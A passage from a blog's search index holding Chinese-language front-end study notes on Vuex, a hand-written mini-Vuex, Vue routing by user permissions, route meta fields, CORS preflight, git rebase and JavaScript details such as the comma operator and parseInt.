class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// mutation-types.js</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> SOME_MUTATION = <span class="string">'SOME_MUTATION'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// store.js</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"><span class="keyword">import</span> &#123; SOME_MUTATION &#125; <span class="keyword">from</span> <span class="string">'./mutation-types'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123; ... &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    <span class="comment">// 我们可以使用 ES2015 风格的计算属性命名功能来使用一个常量作为函数名</span></span><br><span class="line">    [SOME_MUTATION] (state) &#123;</span><br><span class="line">      <span class="comment">// mutate state</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br><span class="line">    </span><br><span class="line"><span class="comment">// JavaScript语言定义对象的属性，有两种方法</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">// 方法一</span></span><br><span class="line">obj.foo = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二</span></span><br><span class="line">obj[<span class="string">'a'</span> + <span class="string">'bc'</span>] = <span class="number">123</span>;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Action：Action 类似于 mutation，不同在于：</p><ul><li><p>Action 提交的是 mutation，而不是直接变更状态。</p></li><li><p>Action 可以包含任意异步操作。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increment (state) &#123;</span><br><span class="line">      state.count++</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    increment (context) &#123;</span><br><span class="line">      context.commit(<span class="string">'increment'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li><li><p>Action 函数接受一个与 store 实例具有相同方法和属性的 context 对象，因此你可以调用 <code>context.commit</code> 提交一个 mutation，或者通过 <code>context.state</code> 和 <code>context.getters</code> 来获取 state 和 getters。实践中，我们会经常用到 ES2015 的 <a href="https://github.com/lukehoban/es6features#destructuring" target="_blank" rel="noopener">参数解构</a> 来简化代码（特别是我们需要调用 <code>commit</code> 很多次的时候）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">actions: &#123;</span><br><span class="line">  increment (&#123; commit &#125;) &#123;</span><br><span class="line">    commit(<span class="string">'increment'</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>Actions 支持同样的载荷方式和对象方式进行分发：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 以载荷形式分发</span></span><br><span class="line">store.dispatch(<span class="string">'incrementAsync'</span>, &#123;</span><br><span class="line">  amount: <span class="number">10</span></span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以对象形式分发</span></span><br><span class="line">store.dispatch(&#123;</span><br><span class="line">  type: <span class="string">'incrementAsync'</span>,</span><br><span class="line">  amount: <span class="number">10</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ul></li><li><p>Module：由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。</p><ul><li>为了解决以上问题，Vuex 允许我们将 store 分割成<strong>模块（module）</strong>。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割</li></ul></li><li><p>具体使用请看<a href="https://vuex.vuejs.org/zh/guide/state.html" target="_blank" rel="noopener">官方文档</a></p></li></ul><h2 id="vue-devtools"><a href="#vue-devtools" class="headerlink" title="vue-devtools"></a>vue-devtools</h2><p>vue-devtools是一款基于chrome浏览器的插件,用于vue应用的调试,帮助我们快速的调试开发vue应用</p><h2 id="模拟-Vuex"><a href="#模拟-Vuex" class="headerlink" title="模拟 Vuex"></a>模拟 Vuex</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> _Vue = <span class="literal">null</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Store</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (options) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123;</span><br><span class="line">      state = &#123;&#125;,</span><br><span class="line">      getters = &#123;&#125;,</span><br><span class="line">      mutations = &#123;&#125;,</span><br><span class="line">      actions = &#123;&#125;</span><br><span class="line">    &#125; = options</span><br><span class="line">    <span class="keyword">this</span>.state = _Vue.observable(state)</span><br><span class="line">    <span class="keyword">this</span>.getters = <span class="built_in">Object</span>.create(<span class="literal">null</span>)</span><br><span class="line">    <span class="built_in">Object</span>.keys(getters).forEach(<span class="function"><span class="params">key</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="built_in">Object</span>.defineProperty(<span class="keyword">this</span>.getters, key, &#123;</span><br><span class="line">        get: <span class="function"><span class="params">()</span> =&gt;</span> getters[key](state)</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">this</span>._mutations = mutations</span><br><span class="line">    <span class="keyword">this</span>._actions = actions</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  commit (type, payload) &#123;</span><br><span class="line">    <span class="keyword">this</span>._mutations[type](<span class="keyword">this</span>.state, payload)</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  dispatch (type, payload) &#123;</span><br><span class="line">    <span class="keyword">this</span>._actions[type](<span class="keyword">this</span>, payload)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">install</span> (<span class="params">Vue</span>) </span>&#123;</span><br><span class="line">  _Vue = Vue</span><br><span class="line">  _Vue.mixin(&#123;</span><br><span class="line">    beforeCreate () &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.$options.store) &#123;</span><br><span class="line">        _Vue.prototype.$store = <span class="keyword">this</span>.$options.store</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  Store,</span><br><span class="line">  install</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>测试</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'../myvuex'</span></span><br><span class="line"></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    count: <span class="number">0</span>,</span><br><span class="line">    msg: <span class="string">'Hello World'</span></span><br><span class="line">  &#125;,</span><br><span class="line">  getters: &#123;</span><br><span class="line">    reverseMsg (state) &#123;</span><br><span class="line">      <span class="keyword">return</span> state.msg.split(<span class="string">''</span>).reverse().join(<span class="string">''</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    increate (state, payload) &#123;</span><br><span class="line">      state.count += payload</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line">    increateAsync (context, payload) &#123;</span><br><span class="line">      setTimeout(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">        context.commit(<span class="string">'increate'</span>, payload)</span><br><span class="line">      &#125;, <span class="number">2000</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>日常-10.21</title>
      <link href="2020/10/21/%E6%97%A5%E5%B8%B8-2020.10.21/"/>
      <url>2020/10/21/%E6%97%A5%E5%B8%B8-2020.10.21/</url>
      
        <content type="html"><![CDATA[<ul><li>根据权限动态添加路由列表</li><li>配置路由meta属性</li><li>application/x-www-form-urlencoded 和 application/json</li><li>git rebase</li><li>预检请求</li><li>props单向传递</li><li>(0,function)</li><li>parseInt解析字符串</li></ul><a id="more"></a><h2 id="根据权限动态添加路由列表"><a href="#根据权限动态添加路由列表" class="headerlink" title="根据权限动态添加路由列表"></a>根据权限动态添加路由列表</h2><ul><li>业务场景：不同用户调用权限接口获得的权限是不同的，根据用户权限动态展示路由列表</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">api.getAuditInfo(&#123;</span><br><span class="line">          account: username,</span><br><span class="line">      &#125;).then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.log(<span class="string">'权限代码:'</span>, res)</span><br><span class="line">          <span class="comment">// 高级权限：可以查看某一块路由</span></span><br><span class="line">          <span class="keyword">if</span> (res.includes(<span class="string">'auth0'</span>)) &#123;</span><br><span class="line">              <span class="built_in">window</span>.authInfo = <span class="literal">true</span></span><br><span class="line">              <span class="comment">// 添加路由</span></span><br><span class="line">              <span class="keyword">this</span>.$router.addRoutes(videoRoutes)</span><br><span class="line">              <span class="keyword">this</span>.$router.options.routes.push(...videoRoutes)</span><br><span class="line">          <span class="comment">// 普通权限</span></span><br><span class="line">          &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.includes(<span class="string">'auth1'</span>) &amp;&amp; !res.includes(<span class="string">'auth0'</span>)) &#123;</span><br><span class="line">              <span class="built_in">window</span>.authInfo = <span class="literal">false</span></span><br><span class="line">          <span class="comment">// 没有权限时返回</span></span><br><span class="line">          &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="built_in">window</span>.location.href = <span class="string">`</span></span><br><span class="line"><span class="string">          &#125;</span></span><br><span class="line"><span class="string">      &#125;)</span></span><br></pre></td></tr></table></figure><h2 id="配置路由meta属性"><a href="#配置路由meta属性" class="headerlink" title="配置路由meta属性"></a>配置路由meta属性</h2><ul><li>业务场景：同一个组件在不同路由下的展示状态是不同的，这时可以配置路由meta属性来实现</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> routes = [</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">'/audit/video'</span>,</span><br><span class="line">        name: <span class="string">'视频管理'</span>,</span><br><span class="line">        component: Layout,</span><br><span class="line">        children: [</span><br><span class="line">            &#123;</span><br><span class="line">                path: <span class="string">'videoList'</span>,</span><br><span class="line">                name: <span class="string">'视频列表'</span>,</span><br><span class="line">                meta: &#123;</span><br><span class="line">                    noCache: <span class="literal">true</span>,</span><br><span class="line">                    cityChange: <span class="literal">true</span>,</span><br><span class="line">                &#125;,</span><br><span class="line">                component: auditvideoList</span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                path: <span class="string">'auditList'</span>,</span><br><span class="line">                name: <span class="string">'审核列表'</span>,</span><br><span class="line">                <span class="comment">// 配置 meta 属性</span></span><br><span class="line">                meta: &#123;</span><br><span class="line">                    noCache: <span class="literal">true</span>,</span><br><span class="line">                    cityDefault: <span class="literal">true</span> </span><br><span class="line">                &#125;,</span><br><span class="line">                component: auditList</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        path: <span class="string">'*'</span>,</span><br><span class="line">        redirect: <span class="string">'/audit/agent'</span>,</span><br><span class="line">        hidden: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure><ul><li>比如说 header 中的一个组件，不同路由页面均展示，只是状态不同</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">    &lt;div v-if=&quot;!cityDefault&quot;&gt;&lt;/div&gt;</span><br><span class="line">&lt;div v-else &gt;&lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">computed: &#123;</span><br><span class="line">        cityDefault() &#123;</span><br><span class="line">            return this.$route.meta.cityDefault;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="application-x-www-form-urlencoded-和-application-json"><a href="#application-x-www-form-urlencoded-和-application-json" class="headerlink" title="application/x-www-form-urlencoded 和 application/json"></a>application/x-www-form-urlencoded 和 application/json</h2><ul><li>application/x-www-form-urlencoded<ul><li>HTTP会将请求参数用key1=val1&amp;key2=val2的方式进行组织，并放到请求实体里面</li></ul></li><li>application/json<ul><li>JSON 是一种轻量级的数据格式，以“键-值”对的方式组织的数据。这个使用这个类型，需要参数本身就是json格式的数据，参数会被直接放到请求实体里，不进行任何处理。</li></ul></li><li>可以参考<a href="https://www.jianshu.com/p/de5845b4c095" target="_blank" rel="noopener">Content-Type 详解</a></li></ul><h2 id="git-rebase"><a href="#git-rebase" class="headerlink" title="git rebase"></a>git rebase</h2><ul><li>git rebase -i：合并多次提交记录</li><li>git rebase master：与 merge 的区别是不会有 merge 的 commit，保持干净的提交记录</li></ul><p>参考<a href="https://www.codercto.com/a/45325.html" target="_blank" rel="noopener">这一次彻底搞懂 Git Rebase</a>，<a href="https://zhuanlan.zhihu.com/p/141871803" target="_blank" rel="noopener">完美生活：git rebase -i | Linux 中国</a>，<a href="https://www.jianshu.com/p/4a8f4af4e803" target="_blank" rel="noopener">【Git】rebase 用法小结</a></p><h2 id="预检请求"><a href="#预检请求" class="headerlink" title="预检请求"></a>预检请求</h2><ul><li>预检请求会向服务器确认跨域是否允许，服务返回的响应头里有对应字段<code>Access-Control-Allow-Origin</code>来给浏览器判断：如果允许，浏览器紧接着发送实际请求；不允许，报错并禁止客户端脚本读取响应相关的任何东西。</li><li>参考<a href="https://zhuanlan.zhihu.com/p/46405073" target="_blank" rel="noopener">预检请求 OPTIONS</a></li></ul><h2 id="props单向传递"><a href="#props单向传递" class="headerlink" title="props单向传递"></a>props单向传递</h2><ul><li>由于props是单向传递，如果在子组件中改变父组件传来的值 vue 会报出警告</li><li>首先想到的办法是在子组件中声明一个局部变量存储 props 的值，可以改变这个局部变量</li><li>但是会存在一个问题，如下：</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 子组件</span></span><br><span class="line">created() &#123;</span><br><span class="line">    <span class="keyword">this</span>.localData = <span class="keyword">this</span>.propData</span><br><span class="line">&#125;,</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 如果这样赋值的话，若父组件中改变 propData 的值，子组件中不会响应式改变，解决办法是</span></span><br><span class="line">created() &#123;</span><br><span class="line">    <span class="keyword">this</span>.$set(<span class="keyword">this</span>, <span class="string">'localData'</span>, <span class="keyword">this</span>.propData)</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><h2 id="0-function"><a href="#0-function" class="headerlink" title="(0,function)"></a>(0,function)</h2><blockquote><p>逗号运算符，它将先计算左边的参数，再计算右边的参数值。然后返回最右边参数的值。 </p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = &#123;</span><br><span class="line">  foo: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line">a.foo(); <span class="comment">// Returns 'false' in console</span></span><br><span class="line">(<span class="number">0</span>, a.foo)(); <span class="comment">// Returns 'true' in console</span></span><br></pre></td></tr></table></figure><p>But, if you were call <code>(0, a.foo)()</code>. The expression <code>(0, a.foo)</code> will evaluate each of its operands (from left to right) and returns the value of the last operand. In other words, <code>(0, a.foo)</code> is equivalent to </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="parseInt解析字符串"><a href="#parseInt解析字符串" class="headerlink" title="parseInt解析字符串"></a>parseInt解析字符串</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="string">"10"</span>);<span class="comment">//返回 10</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"19"</span>,<span class="number">10</span>);<span class="comment">//返回 19 (10+9)</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"11"</span>,<span class="number">2</span>);<span class="comment">//返回 3 (2+1)</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"17"</span>,<span class="number">8</span>);<span class="comment">//返回 15 (8+7)</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"1f"</span>,<span class="number">16</span>);<span class="comment">//返回 31 (16+15)</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">"010"</span>);<span class="comment">//未定：返回 10 或 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//BigInt也有转换进制的功能</span></span><br><span class="line">BigInt(<span class="string">"0b"</span>+<span class="string">"10"</span>) <span class="comment">//2</span></span><br><span class="line">BigInt(<span class="string">"0o"</span>+<span class="string">"10"</span>) <span class="comment">//8</span></span><br><span class="line">BigInt(<span class="string">"0x"</span>+<span class="string">"10"</span>) <span class="comment">//16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//那么10进制怎么转换成2进制呢</span></span><br><span class="line">NumberObject.toString(radix);</span><br><span class="line"></span><br><span class="line"><span class="comment">//parseInt还具有向下取整的功能</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">2.5</span>) <span class="comment">//2</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue源码学习（三）</title>
      <link href="2020/10/20/%E6%95%B4%E7%90%86-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/"/>
      <url>2020/10/20/%E6%95%B4%E7%90%86-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%89%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>Array.prototype.concat.apply</li><li>模板编译</li><li>简述 Vue 首次渲染过程</li><li>简述 Vue 首次模板编译过程</li></ul><a id="more"></a><h2 id="Array-prototype-concat-apply"><a href="#Array-prototype-concat-apply" class="headerlink" title="Array.prototype.concat.apply"></a>Array.prototype.concat.apply</h2><ul><li>如果<code>concat方法</code>的<code>参数</code>是一个元素，该元素会被直接插入到新数组中；如果参数是一个<code>数组</code>，<code>该数组的各个元素</code>将被插入到<code>新数组</code>中；将该特性应用到代码中完成数组降维</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vue 源码中的一段</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">simpleNormalizeChildren</span> (<span class="params">children: any</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; children.length; i++) &#123;</span><br><span class="line">        <span class="comment">// 如果第 i 项是数组则降维</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(children[i])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.concat.apply([], children)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> children</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试</span></span><br><span class="line"><span class="keyword">let</span> children = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>], <span class="number">7</span>, <span class="number">8</span>, [<span class="number">9</span>, <span class="number">10</span>]];</span><br><span class="line">simpleNormalizeChildren(children);</span><br><span class="line"><span class="comment">// [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]</span></span><br></pre></td></tr></table></figure><h2 id="模板编译"><a href="#模板编译" class="headerlink" title="模板编译"></a>模板编译</h2><ul><li>模板编译的主要目的是将模板 (template) 转换为渲染函数 (render)</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> @<span class="attr">click</span>=<span class="string">"handler"</span>&gt;</span>title<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>some content<span class="tag">&lt;/<span class="name">p</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li>渲染函数 render</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">render (h) &#123; </span><br><span class="line">    <span class="keyword">return</span> h(<span class="string">'div'</span>, [ </span><br><span class="line">        h(<span class="string">'h1'</span>, &#123; <span class="attr">on</span>: &#123; <span class="attr">click</span>: <span class="keyword">this</span>.handler&#125; &#125;, <span class="string">'title'</span>), </span><br><span class="line">        h(<span class="string">'p'</span>, <span class="string">'some content'</span>) </span><br><span class="line">    ]) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>模板编译的作用</p><ul><li>Vue 2.x 使用 VNode 描述视图以及各种交互，用户自己编写 VNode 比较复杂</li><li>用户只需要编写类似 HTML 的代码 - Vue 模板，通过编译器将模板转换为返回 VNode 的 render 函数</li><li>.vue 文件会被 webpack 在构建的过程中转换成 render 函数（Vue-loader）</li></ul></li><li><p>在线编译</p><ul><li>vue2.xx版本在线编译:<a href="https://template-explorer.vuejs.org/#" target="_blank" rel="noopener">https://template-explorer.vuejs.org/#</a></li><li>vue3.xx版本在线编译:<a href="https://vue-next-template-explorer.netlify.app/#" target="_blank" rel="noopener">https://vue-next-template-explorer.netlify.app/#</a></li></ul></li></ul><h2 id="简述-Vue-首次渲染过程"><a href="#简述-Vue-首次渲染过程" class="headerlink" title="简述 Vue 首次渲染过程"></a>简述 Vue 首次渲染过程</h2><p>参考<a href="https://blog.csdn.net/sinat_35349493/article/details/107684898" target="_blank" rel="noopener">大前端学习-Vue首次渲染过程</a></p><h2 id="简述-Vue-首次模板编译过程"><a href="#简述-Vue-首次模板编译过程" class="headerlink" title="简述 Vue 首次模板编译过程"></a>简述 Vue 首次模板编译过程</h2><p>参考<a href="https://blog.csdn.net/weixin_40599109/article/details/107645458?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.add_param_isCf" target="_blank" rel="noopener">Vue 中模板的编译过程概述</a></p>]]></content>
      
      
      <categories>
          
          <category> Vue </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Vue源码学习（二）</title>
      <link href="2020/10/16/%E6%95%B4%E7%90%86-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2020/10/16/%E6%95%B4%E7%90%86-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
